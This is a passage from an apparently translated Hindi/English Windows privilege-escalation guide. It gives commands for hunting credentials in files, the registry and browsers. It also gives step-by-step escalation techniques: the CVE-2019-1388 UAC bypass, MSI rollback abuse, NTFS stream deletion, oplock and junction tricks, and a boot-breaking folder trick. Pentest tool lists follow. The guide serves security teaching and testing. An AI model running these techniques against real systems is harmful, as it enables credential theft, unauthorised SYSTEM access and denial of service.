dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

आपको Bin भी चेक करना चाहिए ताकि उसके अंदर credentials तो न हों

To **recover passwords** saved by several programs you can use: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**अन्य संभावित रजिस्ट्री कुंजियाँ जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**openssh keys को registry से निकालें.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome या Firefox** के पासवर्ड स्टोर होते हैं।\
साथ ही ब्राउज़र के history, bookmarks और favourites भी चेक करें क्योंकि शायद कुछ **पासवर्ड** वहाँ स्टोर हों।

ब्राउज़र्स से पासवर्ड निकालने के लिए टूल्स:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system के भीतर बनी एक technology है जो विभिन्न भाषाओं के software components के बीच **intercommunication** की अनुमति देती है। प्रत्येक COM component को **identified via a class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality expose करता है, जिनकी पहचान interface IDs (IIDs) से होती है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत परिभाषित होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** को मर्ज करके बनाई जाती है।

इस registry के CLSIDs के अंदर आप child registry **InProcServer32** पाएँगे जिसमें एक **default value** होती है जो एक **DLL** की ओर इशारा करती है और एक value होती है जिसका नाम **ThreadingModel** होता है जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकता है।

![](<../../images/image (729).png>)

बुनियादी तौर पर, यदि आप उन किसी भी **DLLs** को **overwrite** कर सकें जिन्हें execute किया जाना है, तो आप **escalate privileges** कर सकते हैं यदि वह DLL किसी अलग user द्वारा execute किया जाता है।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **सामान्य पासवर्ड खोज फाइलों और registry में**

**फाइलों की सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशिष्ट फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले टूल्स

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin मैंने यह plugin बनाया है जो **स्वचालित रूप से victim के अंदर credentials खोजने वाले हर metasploit POST module को चलाता है**।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वतः उन सभी फ़ाइलों की खोज करता है जिनमें इस पेज में उल्लिखित पासवर्ड होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से पासवर्ड निकालने के लिए एक और शानदार टूल है।

टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई टूल्स के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

यह पेज देखें **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

एक user के रूप में shell मिलने पर, वहां scheduled tasks या अन्य प्रक्रियाएँ चल रही हो सकती हैं जो **pass credentials on the command line** करती हैं। नीचे दिया गया स्क्रिप्ट हर दो सेकंड में process command lines को capture करता है और वर्तमान स्थिति की तुलना पिछले स्थिति से करता है, और किसी भी बदलाव को output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (via console या RDP) और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में एक unprivileged user से "NT\AUTHORITY SYSTEM" जैसे terminal या किसी अन्य process को चलाना संभव है।

यह उसी कमज़ोरी के साथ एक ही समय में privileges को escalate करने और UAC को bypass करने की अनुमति देता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं है और प्रक्रिया के दौरान उपयोग किया गया binary Microsoft द्वारा signed और issued है।

प्रभावित सिस्टमों में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित चरण आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## Administrator Medium से High Integrity Level / UAC Bypass तक

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

हमला मूलतः Windows Installer के rollback फीचर का दुरुपयोग करके uninstall प्रक्रिया के दौरान वैध फ़ाइलों को malicious फ़ाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनानी होगी जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए इस्तेमाल होगी — बाद में Windows Installer उसी फ़ोल्डर में rollback फ़ाइलें स्टोर करेगा और उन rollback फ़ाइलों में malicious payload शामिल कर दिया जाएगा।

संक्षेप में तकनीक इस प्रकार है:

1. **Stage 1 – Hijack की तैयारी (छोड़ें `C:\Config.Msi` खाली)**

- Step 1: Install the MSI
- एक `.msi` बनाएं जो एक हानिरहित फ़ाइल (उदा., `dummy.txt`) को किसी writable फ़ोल्डर (`TARGETDIR`) में इंस्टॉल करे।
- इंस्टॉलर को **"UAC Compliant"** के रूप में मार्क करें, ताकि **non-admin user** इसे चला सके।
- इंस्टॉल के बाद फ़ाइल पर एक **handle** खुला रखें।

- Step 2: Begin Uninstall
- उसी `.msi` को uninstall करें।
- uninstall प्रक्रिया फ़ाइलों को `C:\Config.Msi` में मूव करना और उन्हें `.rbf` फ़ाइलों (rollback बैकअप) में rename करना शुरू कर देती है।
- **GetFinalPathNameByHandle** का उपयोग करके open file handle को poll करें ताकि पता चल सके कब फ़ाइल `C:\Config.Msi\<random>.rbf` बन जाती है।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है जो:
- यह signal करता है जब `.rbf` लिख दी जाती है।
- फिर uninstall जारी रखने से पहले किसी अन्य event पर **wait** करता है।

- Step 4: Block Deletion of `.rbf`
- जब signal मिल जाए, तो `FILE_SHARE_DELETE` के बिना `.rbf` फ़ाइल को **open** करें — इससे उसे delete होने से रोका जा सकता है।
- फिर uninstall पूरा होने के लिए **signal back** करें।
- Windows Installer `.rbf` को delete करने में असफल रहता है, और चूँकि वह सभी contents को हटा नहीं सकता, **`C:\Config.Msi` हटाया नहीं जाता**।

- Step 5: Manually Delete `.rbf`
- आप (attacker) `.rbf` फ़ाइल को मैन्युअली delete कर देते हैं।
- अब **`C:\Config.Msi` खाली है**, hijack के लिए तैयार।

> इस बिंदु पर, `C:\Config.Msi` को delete करने के लिए **trigger the SYSTEM-level arbitrary folder delete vulnerability**।

2. **Stage 2 – Rollback Scripts को Malicious Scripts से Replace करना**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- स्वयं `C:\Config.Msi` फ़ोल्डर को पुनः बनाएं।
- कमजोर DACLs सेट करें (उदा., Everyone:F), और `WRITE_DAC` के साथ एक handle खुला रखें।

- Step 7: Run Another Install
- `.msi` को फिर से इंस्टॉल करें, जिसमें:
- `TARGETDIR`: Writable location।
- `ERROROUT`: एक variable जो forced failure ट्रिगर करता है।
- यह install फिर से **rollback** ट्रिगर करने के काम आएगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` पर निगरानी रखें जब तक कि एक नई `.rbs` न दिखाई दे।
- उसकी filename कैप्चर करें।

- Step 9: Sync Before Rollback
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** होता है जो:
- `.rbs` बनते ही एक event signal करता है।
- फिर जारी रखने से पहले **wait** करता है।

- Step 10: Reapply Weak ACL
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs** फिर से लागू करता है।
- लेकिन चूँकि आपके पास अभी भी `WRITE_DAC` के साथ एक handle खुला है, आप फिर से **weak ACLs** लागू कर सकते हैं।

> ACLs केवल handle open पर लागू होते हैं, इसलिए आप अभी भी फ़ोल्डर में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` फ़ाइल को overwrite करके एक **fake rollback script** रखें जो Windows को बताती है:
- आपकी `.rbf` फ़ाइल (malicious DLL) को एक **privileged location** में	restore करे (उदा., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
- आपकी fake `.rbf` छोड़ें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Trigger the Rollback
- sync event को signal करें ताकि installer फिर से चले।
- एक **type 19 custom action (`ErrorOut`)** ऐसे configure किया गया है कि वह install को जानकारी से विफल कर दे।
- इससे **rollback शुरू** हो जाता है।

- Step 13: SYSTEM आपके DLL को इंस्टॉल करता है
- Windows Installer:
- आपकी malicious `.rbs` पढ़ता है।
- आपकी `.rbf` DLL को target location में copy करता है।
- अब आपके पास **SYSTEM-loaded path में malicious DLL** मौजूद है।

- Final Step: Execute SYSTEM Code
- एक trusted **auto-elevated binary** चलाएँ (उदा., `osk.exe`) जो आपके hijacked DLL को load करे।
- **Boom**: आपका कोड **as SYSTEM** execute हो जाता है।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP तक

मुख्य MSI rollback तकनीक (ऊपर वाली) यह मानती है कि आप एक **पूरा फ़ोल्डर** (उदा., `C:\Config.Msi`) delete कर सकते हैं। पर अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो क्या होगा?

आप **NTFS internals** का दुरुपयोग कर सकते हैं: हर फ़ोल्डर का एक hidden alternate data stream होता है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह स्ट्रीम फ़ोल्डर के **इंडेक्स मेटाडेटा** को स्टोर करती है।

इसलिए, यदि आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` स्ट्रीम को डिलीट** कर देते हैं, तो NTFS फ़ाइलसिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह मानक फ़ाइल हटाने वाली APIs जैसे इस्तेमाल करके कर सकते हैं:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *फ़ाइल* delete API को कॉल कर रहे हों, यह **खुद फोल्डर को हटाता है**।

### फ़ोल्डर सामग्री हटाने से SYSTEM EoP तक
यदि आपका प्रिमिटिव आपको मनमाने फ़ाइलों/फ़ोल्डरों को हटाने की अनुमति नहीं देता, लेकिन यह **हमलावर-नियंत्रित फ़ोल्डर की *सामग्री* को हटाने की अनुमति देता है** तो क्या?

1. चरण 1: एक लुभावना फ़ोल्डर और फ़ाइल बनाएँ
- बनाएं: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. चरण 2: `file1.txt` पर एक **oplock** लगाएँ
- यह oplock उस समय **कार्यन्वयन को रोक देता है** जब कोई उच्चाधिकार प्राप्त प्रोसेस `file1.txt` को हटाने की कोशिश करता है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM process ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करती है और उनकी सामग्री हटाने की कोशिश करती है।
- जब यह `file1.txt` पर पहुँचती है, तो **oplock ट्रिगर हो जाता है** और नियंत्रण आपके callback को सौंप दिया जाता है।

4. चरण 4: oplock callback के अंदर – हटाने को पुनर्निर्देशित करें

- विकल्प A: `file1.txt` को किसी अन्य स्थान पर स्थानांतरित करें
- यह oplock को तोड़े बिना `folder1` को खाली कर देता है।
- `file1.txt` को सीधे न हटाएँ — इससे oplock समयपूर्व रूप से मुक्त हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएँ:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream लक्षित करता है जो फ़ोल्डर metadata को स्टोर करता है — इसे हटाने से फ़ोल्डर हट जाता है।

5. चरण 5: oplock जारी करें
- SYSTEM process जारी रहता है और `file1.txt` को हटाने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में हटा रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटाया जाता है।

### From Arbitrary Folder Create से Permanent DoS तक

एक primitive का शोषण करें जो आपको **create an arbitrary folder as SYSTEM/admin** करने देता है — भले ही आप **you can’t write files** या **set weak permissions** ना कर सकें।

ऐसा **folder** (not a file) बनाएं जिसका नाम किसी **critical Windows driver** जैसा हो, e.g.:
```
C:\Windows\System32\cng.sys
```
- यह path सामान्यतः `cng.sys` kernel-mode driver के अनुरूप होता है।
- यदि आप इसे **पहले से एक फ़ोल्डर के रूप में बना देते हैं**, तो Windows boot पर वास्तविक driver को load करने में विफल हो जाता है।
- फिर, Windows boot के दौरान `cng.sys` को लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक driver को resolve करने में विफल रहता है**, और **crashes या boot को halt कर देता है**।
- बिना external intervention (जैसे, boot repair या disk access) के **कोई fallback नहीं**, और **कोई recovery नहीं** होती।


## **High Integrity से SYSTEM तक**

### **नया service**

यदि आप पहले से ही High Integrity process पर चल रहे हैं, तो **path to SYSTEM** आसानी से सिर्फ **नया service बनाकर और execute करके** हासिल किया जा सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक valid service हो या binary आवश्यक क्रियाएँ जल्दी से करता हो — अगर यह valid service नहीं होगा तो इसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable** करने की कोशिश कर सकते हैं और एक _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** कर सकते हैं।  
[अधिक जानकारी इन registry keys और _.msi_ package को install करने के बारे में यहाँ।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**यहाँ कोड पा सकते हैं**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास उन token privileges हैं (संभावना है कि आप इन्हें किसी पहले से मौजूद High Integrity process में पाएंगे), तो आप SeDebug privilege का उपयोग करके लगभग किसी भी process (protected processes को छोड़कर) को **open** कर पाएँगे, process का **token copy** कर पाएँगे, और उस token के साथ एक **arbitrary process create** कर पाएँगे।  
इस technique में आम तौर पर **SYSTEM के रूप में चल रहे किसी भी process को चुना जाता है जिसमें सभी token privileges हों** (_हाँ, आप SYSTEM processes पा सकते हैं जिनमें सभी token privileges नहीं होते_)।  
**आप एक** [**उदाहरण कोड जो यह technique execute करता है यहाँ पा सकते हैं**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह technique meterpreter द्वारा getsystem escalate करने के लिए उपयोग की जाती है। यह technique इस पर आधारित है कि **एक pipe बनाया जाए और फिर उस pipe पर लिखने के लिए किसी service को create/abuse किया जाए**। फिर, वह **server** जिसने pipe बनाई है और जिसके पास **`SeImpersonate`** privilege है, pipe client (service) के token को **impersonate** कर सकता है और SYSTEM privileges प्राप्त कर सकता है।  
यदि आप [**named pipes के बारे में और जानना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation)।  
यदि आप [**high integrity से System तक name pipes का उपयोग करके कैसे जाना है इसका उदाहरण पढ़ना चाहते हैं तो यह पढ़ें**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप किसी **dll को hijack** करने में सफल हो जाते हैं जो कि **SYSTEM के रूप में चल रहे किसी process** द्वारा **loaded** हो रहा है, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस प्रकार की privilege escalation के लिए उपयोगी है, और इसके अलावा यह high integrity process से हासिल करना बहुत **आसान** होता है क्योंकि उसके पास dlls को load करने के लिए उपयोग होने वाले फोल्डरों पर **write permissions** होते हैं।  
**आप** [**Dll hijacking के बारे में और पढ़ सकते हैं यहाँ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने का सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)  
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**  
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी इकट्ठा करना (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**  
[**privesc**](https://github.com/enjoiz/Privesc) **-- misconfigurations की जाँच**  
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में उपयोग के लिए -Thorough का उपयोग करें।**  
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**  
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- एकत्र किए गए passwords को domain पर spray करना**  
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle tool.**  
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**  
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc vulnerabilities के लिए खोज (DEPRECATED for Watson)  
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल checks **(Admin rights की आवश्यकता)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities की खोज (VisualStudio का उपयोग करके compile करना होगा) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))  
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजते हुए host को enumerate करता है (ज्यादा gather info tool; compile करना होगा) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**  
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github में precompiled exe)**  
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# port**  
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- misconfiguration के लिए जाँच (executable github में precompiled). सुझाव नहीं। Win10 में अच्छा काम नहीं करता।  
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe). सुझाव नहीं। Win10 में अच्छा काम नहीं करता।

**Bat**

[**winPEASbat**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) -- इस पोस्ट पर आधारित टूल (यह proper काम करने के लिए accesschk की आवश्यकता नहीं है लेकिन इसका उपयोग कर सकता है).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के output को पढ़कर काम करने वाले exploits सुझाता है (local python)  
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के output को पढ़कर काम करने वाले exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

प्रोजेक्ट को सही .NET version का उपयोग करके compile करना होगा ([यहाँ देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). पीड़ित host पर इंस्टॉल .NET version देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
